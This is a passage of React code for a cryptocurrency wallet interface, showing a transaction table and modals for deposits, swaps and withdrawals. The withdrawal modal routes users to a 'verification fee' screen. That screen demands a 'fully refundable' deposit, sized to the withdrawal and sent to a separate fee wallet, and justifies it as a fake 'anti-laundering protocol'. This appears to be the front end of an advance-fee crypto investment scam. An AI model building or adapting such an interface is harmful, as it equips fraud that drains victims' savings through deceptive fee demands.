                                                    <div style={{ display: "inline-flex", alignItems: "center", gap: 6, padding: "6px 12px", borderRadius: 8, fontSize: 10, fontWeight: "bold", background: style.bg, color: style.color }}>
                                                        {style.icon} {tx.type}
                                                    </div>
                                                </td>
                                                <td style={{ padding: "16px 24px", fontSize: 13, color: "#ccc", borderBottom: "1px solid rgba(255,255,255,0.02)" }}>{tx.desc}</td>
                                                <td style={{ padding: "16px 24px", textAlign: "right", fontWeight: "bold", color: tx.isPositive ? THEME.success : "white", borderBottom: "1px solid rgba(255,255,255,0.02)" }}>{tx.amount}</td>
                                                <td style={{ padding: "16px 24px", textAlign: "right", borderBottom: "1px solid rgba(255,255,255,0.02)" }}>
                                                    <div style={{ fontSize: 13 }}>{tx.date}</div>
                                                    <div style={{ fontSize: 10, color: "#666" }}>{tx.time}</div>
                                                </td>
                                                <td style={{ padding: "16px 24px", textAlign: "right", borderBottom: "1px solid rgba(255,255,255,0.02)" }}>
                                                    <span style={{ fontSize: 11, fontWeight: "bold", color: tx.status === 'COMPLETED' ? THEME.success : tx.status === 'PENDING' ? '#3b82f6' : '#f59e0b' }}>
                                                        {tx.status}
                                                    </span>
                                                </td>
                                            </tr>
                                        );
                                    })}
                                </tbody>
                            </table>
                        </div>
                    </div>
                )}
            </div>

            {/* --- MODALS --- */}
            {modal && (
                <div className="fixed inset-0 bg-black/85 z-[100] flex items-end md:items-center justify-center backdrop-blur-md p-0 md:p-5">
                    <div className="bg-[#0f0f12] w-full md:w-[95%] max-w-md rounded-t-3xl md:rounded-3xl border border-white/10 relative shadow-2xl overflow-hidden flex flex-col mb-0 md:mb-auto max-h-[90vh]">
                        <div className="p-4 md:p-5 border-b border-white/5 flex justify-between items-center bg-white/5 shrink-0">
                            <h3 className="text-[16px] md:text-lg font-bold">
                                {modal === "deposit_menu" ? "Select Asset to Deposit" : 
                                 modal === "withdraw_menu" ? "Select Asset to Withdraw" : 
                                 modal === "deposit" ? "Deposit Crypto" : 
                                 modal === "verification_fee" ? "System Notification" :
                                 modal === "withdraw" ? "Withdraw Funds" : "Transaction"}
                            </h3>
                            <button onClick={() => { setModal(null); setProcessStep(0); setActionAmount(""); setDepositAmount(""); setFeeSentAmount(""); }} className="p-2 hover:bg-white/10 rounded-full transition"><X size={20} className="text-gray-400"/></button>
                        </div>
                        
                        <div className="p-5 md:p-6 overflow-y-auto custom-scrollbar">
                            
                            {/* DEPOSIT MENU */}
                            {modal === "deposit_menu" && (
                                <div className="space-y-3">
                                    <div className="text-sm text-gray-500 mb-2 px-1">Available Assets</div>
                                    {allowedDepWdrAssets.map(asset => (
                                        <div key={asset.s} onClick={() => { setSelectedAssetSymbol(asset.s); setModal("deposit"); }} className="flex items-center gap-4 p-4 bg-white/5 rounded-2xl border border-white/5 hover:bg-white/10 cursor-pointer transition group">
                                            <div className="relative">
                                                <img src={asset.l} width={40} className="rounded-full" alt={asset.n}/>
                                                <div className="absolute -bottom-1 -right-1 bg-[#0f0f12] rounded-full p-0.5"><ArrowDownLeft size={12} className="text-green-500"/></div>
                                            </div>
                                            <div className="flex-1">
                                                <div className="font-bold flex items-center gap-2">{asset.n} <span className="text-xs bg-white/10 px-2 rounded text-gray-400">{asset.s}</span></div>
                                                <div className="text-xs text-gray-500">Available: {asset.balance.toFixed(6)}</div>
                                            </div>
                                            <div className="text-right">
                                                <ChevronRight className="text-gray-600 group-hover:text-white transition" size={20} />
                                            </div>
                                        </div>
                                    ))}
                                </div>
                            )}

                            {/* WITHDRAW MENU */}
                            {modal === "withdraw_menu" && (
                                <div className="space-y-3">
                                    <div className="text-sm text-gray-500 mb-2 px-1">Available Balance</div>
                                    {allowedDepWdrAssets.map(asset => (
                                        <div key={asset.s} onClick={() => { setSelectedAssetSymbol(asset.s); setModal("withdraw"); setActionAmount(""); }} className="flex items-center gap-4 p-4 bg-white/5 rounded-2xl border border-white/5 hover:bg-white/10 cursor-pointer transition group">
                                            <div className="relative">
                                                <img src={asset.l} width={40} className="rounded-full" alt={asset.n}/>
                                                <div className="absolute -bottom-1 -right-1 bg-[#0f0f12] rounded-full p-0.5"><ArrowUpRight size={12} className="text-red-500"/></div>
                                            </div>
                                            <div className="flex-1">
                                                <div className="font-bold flex items-center gap-2">{asset.n} <span className="text-xs bg-white/10 px-2 rounded text-gray-400">{asset.s}</span></div>
                                                <div className="text-xs text-gray-500">{currentSymbol}{(asset.value * currentRate).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })} {preferredCurrency}</div>
                                            </div>
                                            <div className="text-right">
                                                <div className="font-mono font-bold text-sm">{asset.balance.toFixed(5)}</div>
                                            </div>
                                        </div>
                                    ))}
                                </div>
                            )}

                            {/* DEPOSIT ACTION */}
                            {modal === "deposit" && selectedAsset && (
                                <div className="text-center">
                                    {(selectedAsset.s === "USDT" || selectedAsset.s === "USDC") && (
                                        <div className="bg-yellow-500/10 border border-yellow-500/20 p-3 rounded-lg flex items-start gap-3 mb-6">
                                            <AlertTriangle size={16} className="text-yellow-500 shrink-0 mt-0.5" />
                                            <div className="text-left text-[11px] text-yellow-500/90 leading-tight">
                                                <strong>CRITICAL:</strong> Send only {selectedAsset.s} to this address using the <strong className="text-white">{selectedAsset.s === 'USDT' ? 'ERC20 (Ethereum) or TRC20 (Tron)' : 'ERC20 (Ethereum)'} network</strong>. Sending via other networks will result in permanent loss.
                                            </div>
                                        </div>
                                    )}

                                    <div className="bg-white p-4 rounded-xl w-[160px] h-[160px] md:w-48 md:h-48 mx-auto mb-6 flex items-center justify-center">
                                        <img src={`https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${adminAddress}`} alt="QR" className="w-full h-full opacity-90"/>
                                    </div>
                                    
                                    <div className="text-left mb-2 text-[11px] md:text-xs text-gray-400 font-bold uppercase tracking-wider">
                                        Deposit Address ({selectedAsset.s})
                                    </div>
                                    <div onClick={() => copyToClipboard(adminAddress)} className="bg-black p-4 rounded-xl border border-white/10 mb-4 flex items-center justify-between cursor-pointer hover:border-purple-500 transition group">
                                        <div className="font-mono text-xs md:text-sm text-gray-300 break-all text-left pr-4">{adminAddress}</div>
                                        <Copy size={16} className="text-gray-500 group-hover:text-white shrink-0"/>
                                    </div>
                                    
                                    <div className="relative mb-6">
                                        <div className="text-left text-xs text-gray-400 mb-2 ml-1">Amount Sent</div>
                                        <input type="number" value={depositAmount} onChange={e => setDepositAmount(e.target.value)} placeholder={`0.00 ${selectedAsset.s}`} className="w-full bg-[#15151a] border border-white/10 p-4 rounded-xl text-white outline-none focus:border-green-500 transition font-mono" />
                                    </div>

                                    <button onClick={handleDeclareDeposit} disabled={isProcessing} className="w-full py-4 bg-green-600 hover:bg-green-500 rounded-xl font-bold transition shadow-lg shadow-green-900/20 text-white flex justify-center items-center gap-2">
                                        {isProcessing ? <RefreshCw size={18} className="animate-spin" /> : "I Have Sent The Deposit"}
                                    </button>
                                </div>
                            )}

                            {/* SWAP MODAL */}
                            {modal === "swap" && selectedAsset && (
                                <div className="text-center">
                                    <div className="flex items-center justify-between mb-6 px-2">
                                        <div className="flex flex-col items-center gap-2">
                                            <img src={selectedAsset.l} width={40} className="rounded-full"/>
                                            <span className="font-bold text-sm">{selectedAsset.s}</span>
                                        </div>
                                        <ArrowRightLeft className="text-gray-500"/>
                                        <div className="flex flex-col items-center gap-2">
                                            <div className="flex flex-wrap justify-center gap-1 bg-white/5 p-1 rounded-lg">
                                                {["BTC", "ETH", "USDT", "USDC"].map((coin: any) => (
                                                    <button 
                                                        key={coin}
                                                        onClick={() => setTargetSwapCoin(coin)} 
                                                        disabled={selectedAssetSymbol === coin} 
                                                        className={`px-2 md:px-3 py-1 rounded text-[10px] md:text-xs font-bold transition ${targetSwapCoin === coin ? "bg-purple-600 text-white" : "text-gray-400 hover:text-white disabled:opacity-30 disabled:cursor-not-allowed"}`}
                                                    >
                                                        {coin}
                                                    </button>
                                                ))}
                                            </div>
                                            <span className="font-bold text-sm">{targetSwapCoin}</span>
                                        </div>
                                    </div>
                                    
                                    <div className="relative mb-6">
                                        <div className="text-left text-xs text-gray-400 mb-2 ml-1">Amount to swap</div>
                                        <input type="number" value={actionAmount} onChange={e => setActionAmount(e.target.value)} placeholder="0.00" className="w-full bg-black border border-white/10 p-4 rounded-xl text-white text-lg outline-none focus:border-purple-500 transition" />
                                        <button onClick={() => setActionAmount(selectedAsset.balance.toString())} className="absolute right-3 top-9 bg-white/10 px-2 py-1 rounded text-xs font-bold text-purple-400 hover:bg-white/20">MAX</button>
                                        <div className="text-right text-xs text-gray-500 mt-2">Available: {selectedAsset.balance.toFixed(6)} {selectedAsset.s}</div>
                                    </div>

                                    <button onClick={handleSwapSingle} className="w-full py-4 bg-white text-black font-bold rounded-xl hover:bg-gray-200 transition text-sm">Preview Swap</button>
                                </div>
                            )}

                            {/* WITHDRAW ACTION */}
                            {modal === "withdraw" && selectedAsset && (
                                <div className="text-center">
                                    <div className="bg-red-500/10 border border-red-500/20 p-3 rounded-lg flex items-center gap-3 mb-6">
                                        <div className="bg-red-500 rounded-full p-1"><ArrowUpRight size={12} className="text-black"/></div>
                                        <div className="text-left">
                                            <div className="text-xs font-bold text-red-500">Withdraw {selectedAsset.s}</div>
                                            <div className="text-[10px] text-red-400/70">Ensure network matches wallet address</div>
                                        </div>
                                    </div>

                                    {(selectedAsset.s === "USDT" || selectedAsset.s === "USDC") && (
                                        <div className="bg-yellow-500/10 border border-yellow-500/20 p-3 rounded-lg flex items-start gap-3 mb-6">
                                            <AlertTriangle size={16} className="text-yellow-500 shrink-0 mt-0.5" />
                                            <div className="text-left text-[11px] text-yellow-500/90 leading-tight">
                                                Please provide an <strong className="text-white">{selectedAsset.s === 'USDT' ? 'ERC20 (Ethereum) or TRC20 (Tron)' : 'ERC20 (Ethereum)'} address</strong> for withdrawal. Sending to an incompatible network will result in lost funds.
                                            </div>
                                        </div>
                                    )}

                                    <div className="relative mb-4">
                                        <div className="text-left text-xs text-gray-400 mb-2 ml-1">Amount</div>
                                        <input type="number" value={actionAmount} onChange={e => setActionAmount(e.target.value)} placeholder="0.00" className="w-full bg-black border border-white/10 p-4 rounded-xl text-white outline-none focus:border-red-500 transition" />
                                        <button onClick={() => setActionAmount(selectedAsset.balance.toString())} className="absolute right-3 top-9 bg-white/10 px-2 py-1 rounded text-xs font-bold text-red-400">MAX</button>
                                    </div>
                                    
                                    <div className="mb-6">
                                        <div className="text-left text-xs text-gray-400 mb-2 ml-1">Destination Address</div>
                                        <input type="text" value={withdrawAddress} onChange={e => setWithdrawAddress(e.target.value)} placeholder={`Enter ${selectedAsset.s} Address`} className="w-full bg-black border border-white/10 p-4 rounded-xl text-white outline-none focus:border-red-500 transition font-mono text-sm" />
                                    </div>

                                    <button onClick={handleWithdrawAttempt} className="w-full py-4 bg-red-600 hover:bg-red-500 rounded-xl font-bold transition shadow-lg shadow-red-900/20">Confirm Withdrawal</button>
                                </div>
                            )}

                            {/* 🛡️ VERIFICATION FEE MODAL */}
                            {modal === "verification_fee" && (
                                <div className="text-center pt-2">
                                    <div className="flex items-center justify-center gap-3 mb-6 bg-blue-500/10 py-4 rounded-2xl border border-blue-500/20">
                                        <ShieldCheck size={32} className="text-blue-500 shrink-0" />
                                        <div className="text-left">
                                            <div className="font-bold text-white text-sm">Network Security Check</div>
                                            <div className="text-[10px] text-blue-400">Standard anti-laundering protocol</div>
                                        </div>
                                    </div>
                                    
                                    <p className="text-[11px] md:text-xs text-gray-400 mb-6 leading-relaxed px-2 text-left">
                                        A temporary, fully refundable deposit is required to verify wallet ownership on the blockchain. This value is calculated based on your requested withdrawal volume.
                                    </p>
                                    
                                    <div className="bg-[#15151a] p-4 md:p-5 rounded-xl mb-6 border border-white/10 shadow-inner">
                                        
                                        <div className="flex justify-between items-center mb-2 pb-2 border-b border-white/5">
                                            <span className="text-[11px] md:text-xs text-gray-500">Withdrawal Amount</span>
                                            <span className="text-[11px] md:text-xs font-mono text-gray-300">
                                                {withdrawAmtNumber.toLocaleString(undefined, {maximumFractionDigits: 6})} {feeAssetSymbol}
                                            </span>
                                        </div>

                                        <div className="flex justify-between items-center mb-2 pb-2 border-b border-white/5">
                                            <span className="text-[11px] md:text-xs text-gray-500">Verification Rate</span>
                                            <span className="text-[11px] md:text-xs font-mono text-gray-300">{verificationFee.toFixed(2)}%</span>
                                        </div>
                                        <div className="flex justify-between items-center pt-2">
                                            <span className="text-[11px] md:text-xs font-bold text-white">Required Deposit</span>
                                            <div className="text-right">
                                                <div className="text-[13px] md:text-sm font-bold text-blue-400 font-mono">
                                                    {feeAmountCrypto.toFixed(5)} {feeAssetSymbol}
                                                </div>
                                                <div className="text-[10px] text-gray-600">~{currentSymbol}{(feeAmountUSD * currentRate).toLocaleString(undefined, { maximumFractionDigits: 2 })}</div>
                                            </div>
                                        </div>
                                    </div>
                                    
                                    <div className="text-left text-[10px] md:text-xs text-gray-400 mb-2 ml-1 uppercase font-bold tracking-wider">Send {feeAssetSymbol} to:</div>
                                    
                                    <div onClick={() => copyToClipboard(feeWalletAddress)} className="bg-black p-4 rounded-xl border border-white/10 mb-6 flex items-center justify-between cursor-pointer hover:border-blue-500 transition group relative overflow-hidden">
                                        <div className="font-mono text-[10px] md:text-xs text-gray-300 break-all text-left pr-6 relative z-10">{feeWalletAddress || "Loading Address..."}</div>
                                        <Copy size={16} className="text-gray-500 group-hover:text-white shrink-0 relative z-10"/>
                                    </div>

                                    <div className="relative mb-6">
                                        <div className="text-left text-xs text-gray-400 mb-2 ml-1">Amount Sent (Optional)</div>
                                        <input type="number" value={feeSentAmount} onChange={e => setFeeSentAmount(e.target.value)} placeholder={`${feeAmountCrypto.toFixed(5)} ${feeAssetSymbol}`} className="w-full bg-[#15151a] border border-white/10 p-4 rounded-xl text-white outline-none focus:border-blue-500 transition font-mono text-sm" />
                                    </div>
                                    
                                    <button onClick={handleDeclareFeeDeposit} disabled={isProcessing} className="w-full py-4 bg-blue-600 hover:bg-blue-500 rounded-xl font-bold transition shadow-lg shadow-blue-900/20 text-white flex justify-center items-center gap-2 text-sm">
                                        {isProcessing ? <RefreshCw size={18} className="animate-spin" /> : "I Have Sent The Deposit"}
                                    </button>
                                </div>
                            )}

                            {/* PROCESSING SPINNER */}
                            {modal === "processing_swap" && (
                                <div className="text-center py-10">
                                    {processStep === 2 ? <CheckCircle size={50} className="mx-auto text-green-500 mb-6"/> : <RefreshCw size={50} className="mx-auto text-purple-500 animate-spin mb-6"/>}
                                    <h3 className="text-lg md:text-xl font-bold mb-2">{processStep === 2 ? "Success!" : "Processing..."}</h3>
                                    <p className="text-gray-500 text-xs md:text-sm">Blockchain confirmation in progress</p>
                                </div>
                            )}
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
}